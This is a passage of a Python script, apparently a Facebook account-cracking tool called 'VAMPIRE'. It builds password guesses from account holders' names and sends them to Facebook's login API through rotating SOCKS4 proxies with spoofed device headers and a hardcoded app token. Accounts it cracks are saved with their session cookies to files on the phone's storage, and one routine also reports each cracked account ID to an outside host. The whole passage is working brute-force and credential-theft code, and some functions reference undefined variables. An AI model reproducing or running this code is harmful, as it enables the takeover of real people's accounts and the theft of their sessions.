                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-M2.txt','a').write(sid+'|'+ps+'\n')
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-M2-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                elif 'www.facebook.com' in q:
                     print(f"\r\r {green}[{red}VAMPIRE-CP{green}]{green} {sid} {red}| {green}{ps} ")
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:continue
            loop+=1
        except Exception as e:time.sleep(30)
#---------FILE M3
    def __MTDTHREE__(sid, name, psw,tl):
        try:
            global oks,cps,loop,xvx
            abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                prox=random.choice(xvx)
                bro={"http":"socks4://"+prox}
                head = {'User-Agent': f'{F3}','Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':sid,'password':ps,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head,proxies=bro).text
                q = json.loads(po)
                if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{sid} {red}| {green}{ps} ")
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-M3.txt','a').write(sid+'|'+ps+'\n')
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-M3-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                elif 'www.facebook.com' in q:
                     print(f"\r\r {green}[{red}VAMPIRE-CP{green}]{green} {sid} {red}| {green}{ps} ")
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:continue
            loop+=1
        except Exception as e:time.sleep(30)
#---------FILE M4
    def __MTDFOUR__(sid, name, psw,tl):
        try:
            global oks,cps,loop,xvx
            abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                prox=random.choice(xvx)
                bro={"http":"socks4://"+prox}
                head = {'User-Agent': f'{F4}','Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':sid,'password':ps,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head,proxies=bro).text
                q = json.loads(po)
                if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{sid} {red}| {green}{ps} ")
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-M4.txt','a').write(sid+'|'+ps+'\n')
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-M4-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                elif 'www.facebook.com' in q:
                     print(f"\r\r {green}[{red}VAMPIRE-CP{green}]{green} {sid} {red}| {green}{ps} ")
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:continue
            loop+=1
        except Exception as e:time.sleep(30)
#---------FILE M5
    def __MTDFIVE__(sid, name, psw,tl):
        try:
            global oks,cps,loop,xvx
            abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                prox=random.choice(xvx)
                bro={"http":"socks4://"+prox}
                head = {'User-Agent': f'{F5}','Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':sid,'password':ps,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head,proxies=bro).text
                q = json.loads(po)
                if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{sid} {red}| {green}{ps} ")
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-M5.txt','a').write(sid+'|'+ps+'\n')
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-M5-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                elif 'www.facebook.com' in q:
                     print(f"\r\r {green}[{red}VAMPIRE-CP{green}]{green} {sid} {red}| {green}{ps} ")
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:continue
            loop+=1
        except Exception as e:time.sleep(30)
except:pass
#---------FILE M6
def __MTDONE6__(ids,names,passlist,tl):
    global oks,cps,loop,xvx
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            prox=random.choice(xvx)
            bro={"http":"socks4://"+prox}
            head = {'User-Agent': f'{F6}','Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':sid,'password':ps,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head,proxies=bro).text
            q = json.loads(po)
            if 'session_key' in q:
                 cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                 print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{sid} {red}| {green}{ps} ")
                 open('/sdcard/VAMPIRE/VAMPIRE-FILE-M6.txt','a').write(sid+'|'+ps+'\n')
                 open('/sdcard/VAMPIRE/VAMPIRE-FILE-M6-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                 oks.append(sid)
                 break
            elif 'www.facebook.com' in q:
                 print(f"\r\r {green}[{red}VAMPIRE-CP{green}]{green} {sid} {red}| {green}{ps} ")
                 open('/sdcard/VAMPIRE/VAMPIRE-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                 cps.append(sid)
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#---------RANDOM M1
def randm(ids,psd,tl):
    global oks,cps,loop,xvx
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            pas = rmpassconf(ids,pas)
            prox=random.choice(xvx)
            bro={"http":"socks4://"+prox}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            headers = {'User-Agent': f'{R1}()', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,proxies=bro).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                if res == 'LIVE':
                    print(f" \r\r {red}[{green}VAMPIRE-OK{red}] {green}{uid} {red}| {green}{pas} ") 
                    oks.append(ids)
                    open('/sdcard/VAMPIRE/VAMPIRE-M1-RN-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    print(f"\r\r {red}[{green}COOKIE{red}]{green} ={abir} {coki}")
                    break
            elif 'www.facebook.com' in q:
                cps.append(ids)
                print(f"\r\r {green}[{red}VAMPIRE-CP{green}] {uid} {red}|{green} {pas} ")
                open('/sdcard/VAMPIRE/VAMPIRE-RNOM-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
#---------RANDOM M2
def randm1(ids,psd,tl):
    global loop,oks,cps,xvx
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            pas = rmpassconf(ids,pas)
            prox=random.choice(xvx)
            bro={"http":"socks4://"+prox}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            headers = {'User-Agent': f'{R2}', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,proxies=bro).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                uid=str(q['uid'])
                abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{uid} {red}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/VAMPIRE/VAMPIRE-M2-RN-OK.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r {red}[{green}COOKIE{red}]{green} ={abir} {coki}")
                    break
            elif 'www.facebook.com' in q:
                cps.append(ids)
                print(f"\r\r {green}[{red}VAMPIRE-CP{green}] {uid} {red}|{green} {pas} ")
                open('/sdcard/VAMPIRE/VAMPIRE-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')                
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#---------RANDOM M3
def randm2(ids,psd,tl):
    global loop,oks,cps,xvx
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            pas = rmpassconf(ids,pas)
            prox=random.choice(xvx)
            bro={"http":"socks4://"+prox}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            headers = {'User-Agent': f'{R3}', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,proxies=bro).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                uid=str(q['uid'])
                abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{uid} {red}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/VAMPIRE/VAMPIRE-M3-RNOM-OK.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r {red}[{green}COOKIE{red}]{green} ={abir} {coki}")
                    break
            elif 'www.facebook.com' in q:
                cps.append(ids)
                print(f"\r\r {green}[{red}VAMPIRE-CP{green}] {uid} {red}|{green} {pas} ")
                open('/sdcard/VAMPIRE/VAMPIRE-RNOM-CP.txt','a').write(ids+'|'+pas+'\n')
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#---------RANDOM M4
def randm3(ids,psd,tl):
    global loop,oks,cps,xvx
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            pas = rmpassconf(ids,pas)
            prox=random.choice(xvx)
            bro={"http":"socks4://"+prox}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            headers = {'User-Agent': f'{R4}', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,proxies=bro).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                uid=str(q['uid'])
                abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{uid} {red}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/VAMPIRE/VAMPIRE-RNOM-OK.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r {red}[{green}COOKIE{red}]{green} ={abir} {coki}")
                    break
            elif 'www.facebook.com' in q:
                cps.append(ids)
                print(f"\r\r {green}[{red}VAMPIRE-CP{green}] {uid} {red}|{green} {pas} ")
                open('/sdcard/VAMPIRE/VAMPIRE-RNOM-CP.txt','a').write(ids+'|'+pas+'\n')
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#---------RANDOM M5
def randm4(ids,psd,tl):
    global loop,oks,cps,xvx
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            pas = rmpassconf(ids,pas)
            prox=random.choice(xvx)
            bro={"http":"socks4://"+prox}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
